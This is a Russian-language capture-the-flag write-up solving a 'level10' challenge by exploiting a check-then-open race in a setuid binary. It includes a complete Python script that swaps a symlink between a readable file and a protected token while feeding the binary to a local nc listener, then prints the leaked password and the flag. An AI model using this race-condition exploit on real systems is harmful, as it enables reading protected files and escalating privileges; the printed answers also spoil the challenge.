В домашней директории пользователя level10 находится два файла:
    1. Исполняемый файл 'level10'
    2. Файл 'token'
Оба файла принадлежат пользователю flag10

- Попробуем запустить файл 'level10'

`./level10`
Результат:
./level10 file host
        sends file to host if you have access to it

- Попробуем посмотреть содержимое файла 'token'
`cat token`
И как обычно результат:
cat: token: Permission denied

- Воспользуемся утилитой 'strings', может она даст понять, к какому именно хосту нужно обращаться
`strings level10`
Среди мусора находим следующее:
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s

Отсюда становится понятно, какой порт нам необходим для хоста

Посмотрим assembly код с некоторыми параметрами:
`ltrace ./level10 token 127.0.0.1`

Результат:
__libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                                        = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)                          = 31
+++ exited (status 31) +++

Бинарный файл использует функцию 'access', давайте посмотрим что это за функция
`man 2 access`

В разделе NOTES можно увидеть следующее:
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
       using open(2) creates a security hole, because the user might exploit the short time interval between checking
       and  opening  the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In
       the example just described, a safer alternative would be to temporarily switch the process's effective user ID
       to the real ID and then call open(2).)

Это как раз то, что мы можем использовать для эксплоита

Мы попробуем воспользоваться коротким промежутком между вызовами 'access()' и 'open()' для получения доступа к файлу (race condition exploit)

`ls -l level10 token`
Результат:
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

Как мы видим, файлы 'level10' и 'token' имеют разрешение на чтение/запись для пользователя flag10
Мы попытаемся получить доступ к 'level10', но вместо этого откроем 'token'
Для этого мы создадим символическую ссылку 'exploit', которая будет почти мгновенно переключаться между '~/level10' и '~/token'.

Создадим python скрипт, который поможет нам в этом:
import os
from subprocess import Popen, PIPE, STDOUT
from multiprocessing import Process

DEVNULL = open(os.devnull, 'w')

def func1():
    while True:
        Popen(["ln", "-fs", "/home/user/level10/level10", "/tmp/exploit"], stdin=PIPE, stdout=DEVNULL, stderr=STDOUT)
        Popen(["ln", "-fs", "/home/user/level10/token", "/tmp/exploit"], stdin=PIPE, stdout=DEVNULL, stderr=STDOUT)

def func2():
    while True:
        Popen(["/home/user/level10/level10", "/tmp/exploit", "127.0.0.1"], stdin=PIPE, stdout=DEVNULL, stderr=STDOUT)

def func3():
    Popen(["nc", "-lk", "6969"])

if __name__ == '__main__':
    p1 = Process(target=func1)
    p1.start()
    p2 = Process(target=func2)
    p2.start()
    p3 = Process(target=func3)
    p3.start()
    p1.join()
    p2.join()
    p3.join()

Будет много много мусора, но среди него можно найти:
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.

Подозреваю, что это то, что нам нужно, попробуем
`su flag10`
`woupa2yuojeeaaed06riuj63c`
`getflag`
Check flag.Here is your token : feulo4b72j7edeahuete3no7c